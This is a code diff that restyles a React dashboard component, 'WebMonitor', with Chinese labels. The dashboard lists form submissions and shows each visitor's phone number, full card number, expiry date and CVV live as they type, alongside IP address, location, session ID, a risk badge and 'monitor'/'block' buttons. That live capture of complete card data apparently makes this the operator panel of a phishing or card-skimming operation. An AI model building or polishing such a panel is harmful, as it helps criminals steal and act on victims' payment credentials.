@@ -115,7 +115,7 @@ const getSubmissionTypeName = (type: string) => {
     case "credit_card": return "信用卡信息";
     case "identity_verification": return "身份验证";
     case "address_proof": return "地址证明";
-    default: return "其他���档";
+    default: return "其他文档";
   }
 };
 
@@ -173,19 +173,19 @@ export function WebMonitor() {
       </div>
 
       <div className="p-6">
-        {/* Table Style List */}
-        <div className="bg-white border border-border rounded-lg overflow-hidden">
+        {/* Clean Table Layout - exactly like reference image */}
+        <div className="space-y-1">
           {submissionData.map((submission, index) => (
-            <div key={submission.id} className="border-b border-border last:border-b-0">
+            <div key={submission.id} className="bg-white hover:bg-gray-50 transition-colors">
               {/* Main Row */}
-              <div className="px-4 py-3 hover:bg-muted/30 transition-colors">
-                <div className="flex items-center justify-between">
-                  {/* Left side - ID and realtime input */}
-                  <div className="flex items-center gap-6">
-                    <div className="flex items-center gap-2">
-                      <Badge 
+              <div className="px-4 py-3">
+                <div className="grid grid-cols-12 gap-4 items-center text-sm">
+                  {/* Column 1: ID & Status */}
+                  <div className="col-span-2">
+                    <div className="flex items-center gap-2 mb-1">
+                      <Badge
                         variant="outline"
-                        className={`cursor-pointer text-xs ${
+                        className={`cursor-pointer text-xs px-2 py-1 ${
                           submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-200" :
                           submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-200" :
                           submission.status === "verified" ? "bg-green-50 text-green-600 border-green-200" :
@@ -196,77 +196,91 @@ export function WebMonitor() {
                       >
                         编号: {submission.id}
                       </Badge>
-                      <span className="text-sm text-muted-foreground">{submission.statusText}</span>
                     </div>
+                    <div className="text-xs text-muted-foreground">{submission.statusText}</div>
+                  </div>
 
-                    {/* Realtime Input - Horizontal Layout */}
+                  {/* Column 2: Realtime Input */}
+                  <div className="col-span-3">
                     {submission.realtimeInput && (
-                      <div className="flex items-center gap-3 text-xs bg-red-50 px-3 py-1 rounded border border-red-200">
-                        <span className="text-red-600 flex items-center gap-1">
-                          🔴 <span className="animate-pulse">●</span>
-                        </span>
-                        {submission.realtimeInput.phone && (
-                          <span className="font-mono">📱 {submission.realtimeInput.phone}</span>
-                        )}
-                        {submission.realtimeInput.cardNumber && (
-                          <span className="font-mono">💳 {submission.realtimeInput.cardNumber}</span>
-                        )}
-                        {submission.realtimeInput.expiryDate && (
-                          <span className="font-mono">📅 {submission.realtimeInput.expiryDate}</span>
-                        )}
-                        {submission.realtimeInput.cvv && (
-                          <span className="font-mono">🔒 {submission.realtimeInput.cvv}</span>
-                        )}
+                      <div className="bg-red-50 px-3 py-2 rounded border border-red-200">
+                        <div className="flex items-center gap-1 text-xs text-red-600 mb-1">
+                          🔴 实时输入 <span className="animate-pulse">●</span>
+                        </div>
+                        <div className="grid grid-cols-2 gap-2 text-xs">
+                          {submission.realtimeInput.phone && (
+                            <div className="font-mono">📱 {submission.realtimeInput.phone}</div>
+                          )}
+                          {submission.realtimeInput.cardNumber && (
+                            <div className="font-mono">💳 {submission.realtimeInput.cardNumber}</div>
+                          )}
+                          {submission.realtimeInput.expiryDate && (
+                            <div className="font-mono">📅 {submission.realtimeInput.expiryDate}</div>
+                          )}
+                          {submission.realtimeInput.cvv && (
+                            <div className="font-mono">🔒 {submission.realtimeInput.cvv}</div>
+                          )}
+                        </div>
                       </div>
                     )}
                   </div>
 
-                  {/* Center - Website, Type, Progress */}
-                  <div className="flex items-center gap-8">
-                    <div>
-                      <div className="text-sm font-medium">{submission.websiteName}</div>
-                      <div className="text-xs text-muted-foreground">{submission.currentPage}</div>
-                    </div>
-
-                    <div className="flex items-center gap-1">
+                  {/* Column 3: Website & Type */}
+                  <div className="col-span-2">
+                    <div className="font-medium text-foreground">{submission.websiteName}</div>
+                    <div className="text-xs text-muted-foreground">{submission.currentPage}</div>
+                    <div className="flex items-center gap-1 mt-1">
                       {getSubmissionTypeIcon(submission.submissionType)}
-                      <span className="text-sm">{getSubmissionTypeName(submission.submissionType)}</span>
+                      <span className="text-xs">{getSubmissionTypeName(submission.submissionType)}</span>
                     </div>
+                  </div>
 
-                    {submission.progress && (
-                      <div className="min-w-[120px]">
+                  {/* Column 4: User */}
+                  <div className="col-span-1">
+                    <div className="text-sm">用户: {submission.userName}</div>
+                  </div>
+
+                  {/* Column 5: Progress */}
+                  <div className="col-span-2">
+                    {submission.progress ? (
+                      <div>
                         <div className="flex justify-between text-xs mb-1">
                           <span>进度</span>
-                          <span>{submission.progressText}</span>
+                          <span className="font-medium">{submission.progressText}</span>
                         </div>
                         <Progress value={submission.progress} className="h-2" />
                       </div>
+                    ) : (
+                      <span className="text-xs text-muted-foreground">等待处理...</span>
                     )}
                   </div>
 
-                  {/* Right side - Risk and Actions */}
-                  <div className="flex items-center gap-4">
-                    <Badge 
-                      variant="outline"
-                      className={`text-xs ${
-                        submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
-                        submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
-                        "bg-green-50 text-green-600 border-green-200"
-                      }`}
-                    >
-                      {submission.riskLevel === "high" ? "🔴 高风险" :
-                       submission.riskLevel === "medium" ? "🟡 中风险" :
-                       "🟢 低风险"}
-                    </Badge>
-
-                    <div className="flex gap-2">
-                      <Button variant="outline" size="sm" className="text-xs h-7 px-3">
-                        {submission.status === "processing" ? "监控" :
-                         submission.status === "pending_review" ? "审核" : "查看"}
-                      </Button>
-                      <Button variant="outline" size="sm" className="text-xs h-7 px-3">
-                        阻止
-                      </Button>
+                  {/* Column 6: Risk & Actions */}
+                  <div className="col-span-2">
+                    <div className="flex items-center justify-between">
+                      <Badge
+                        variant="outline"
+                        className={`text-xs ${
+                          submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
+                          submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
+                          "bg-green-50 text-green-600 border-green-200"
+                        }`}
+                      >
+                        {submission.riskLevel === "high" ? "🔴 高风险" :
+                         submission.riskLevel === "medium" ? "🟡 中风险" :
+                         "🟢 低风险"}
+                      </Badge>
+                      <div className="flex gap-1">
+                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
+                          监控
+                        </Button>
+                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
+                          阻止
+                        </Button>
+                      </div>
+                    </div>
+                    <div className="text-xs text-muted-foreground mt-1">
+                      数据: {submission.dataSize} • {submission.fieldsCount} 字段
                     </div>
                   </div>
                 </div>
@@ -274,23 +288,23 @@ export function WebMonitor() {
 
               {/* Expanded Details */}
               {expandedItems.has(submission.id) && (
-                <div className="px-4 py-3 bg-muted/20 border-t border-border/50">
+                <div className="px-4 py-3 bg-gray-50 border-t border-gray-200">
                   <div className="grid grid-cols-4 gap-4 text-xs">
                     <div>
                       <span className="text-muted-foreground">提交时间: </span>
                       <span className="font-medium">{submission.timestamp}</span>
                     </div>
                     <div>
-                      <span className="text-muted-foreground">用户: </span>
-                      <span className="font-medium">{submission.userName}</span>
+                      <span className="text-muted-foreground">用户位置: </span>
+                      <span className="font-medium">{submission.userLocation}</span>
                     </div>
                     <div>
                       <span className="text-muted-foreground">IP地址: </span>
                       <span className="font-medium">{submission.ipAddress}</span>
                     </div>
                     <div>
-                      <span className="text-muted-foreground">数据: </span>
-                      <span className="font-medium">{submission.dataSize} • {submission.fieldsCount} 字段</span>
+                      <span className="text-muted-foreground">会话ID: </span>
+                      <span className="font-medium">{submission.sessionId || "N/A"}</span>
                     </div>
                   </div>
                 </div>
